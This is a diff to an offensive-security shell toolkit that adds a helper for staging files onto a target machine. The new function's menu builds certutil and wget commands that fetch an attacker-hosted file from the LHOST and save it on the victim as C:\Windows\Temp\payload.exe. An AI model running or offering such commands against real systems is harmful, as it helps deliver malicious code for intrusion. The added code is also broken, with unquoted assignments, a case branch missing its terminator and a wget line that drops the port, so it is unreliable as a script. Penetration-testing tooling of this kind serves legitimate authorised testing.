@@ -13,6 +13,7 @@ The srv namespace provides commands for hosting local services such as web, ftp,
 Commands
 --------
 nb-srv-install          install dependencies
+nb-srv-file-download    download a payload to a target machine
 nb-srv-web              hosts a python web server in current dir
 nb-srv-ftp              hosts a python ftp server in current dir
 nb-srv-smb              hosts an impacket smb server in current dir
@@ -33,6 +34,34 @@ nb-srv-install() {
     __info "Running $0..."
     __pkgs netcat atftpd 
     __pkgs php python python-pip python-smb python-pyftpdlib impacket python-updog
+}
+
+nb-srv-file-download() {
+    __check-project
+    nb-vars-set-lhost
+    nb-vars-set-lport
+
+    echo
+    echo -n "Whats the server port: "
+    read port
+
+    echo
+    echo -n "Whats the filename to download: "
+    read filename
+
+    __ask "Choose a command to copy:"
+    echo "1.  certutil -URLcache -split -f http://<LHOST>:<PORT>/<FILENAME> C:\Windows\Temp\payload.exe"
+    echo "2.  wget http://<LHOST>:<PORT>/<FILENAME>"
+    echo "3. Previous menu"
+    echo
+    read choice
+
+    case $choice in
+        1) __COMMAND=certutil -URLcache -split -f http://${__LHOST}:$port/$filename C:\Windows\Temp\payload.exe;;
+        2) __COMMAND=wget http://${__LHOST}/$filename
+        3) exit;;
+        *) echo "Invalid option";;
+    esac
 }
 
 nb-srv-web() {
